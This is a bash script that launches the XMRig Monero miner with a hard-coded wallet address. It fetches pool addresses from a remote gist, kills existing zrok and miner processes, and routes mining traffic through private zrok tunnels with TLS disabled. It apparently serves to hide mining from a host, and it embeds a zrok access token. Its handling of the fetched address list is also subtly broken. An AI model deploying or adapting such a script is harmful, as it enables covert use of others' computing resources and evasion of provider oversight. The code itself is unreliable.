#!/bin/bash

CONFIG_URL="https://gist.githubusercontent.com/Luisbuttocks/ac7b5ada6be6cd004958c0809b12ebdc/raw/bd79d67f34fbb3b90c6b686fc2f545731f633988/gistfile1.txt"
WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"

BIND_IPS=$(curl -s $CONFIG_URL)
pkill -f zrok
pkill -f xmrig-x86_64-st
./zrok enable 23hr12Uz33O1 > /dev/null 2>&1

for ip in $BIND_IPS; do
    echo "Binding bridge to $ip..."
    nohup ./zrok access private proxy1 --bind "$ip:9999" --headless > /dev/null 2>&1 &
done
sleep 5

XMRIG_CMD="./xmrig-x86_64-static -c config.json --tls false"

# Append each IP from your gist as a pool
for ip in "${BIND_IPS[@]}"; do
    # Explicitly tell XMRig this pool is NOT tls
    XMRIG_CMD="$XMRIG_CMD -o $ip:9999 --tls false"
done

# 7. Start XMRig in FOREGROUND
echo "-------------------------------------------------------"
echo "Launching XMRig with ${#BIND_IPS[@]} local bridges (TLS DISABLED)"
echo "-------------------------------------------------------"
$XMRIG_CMD
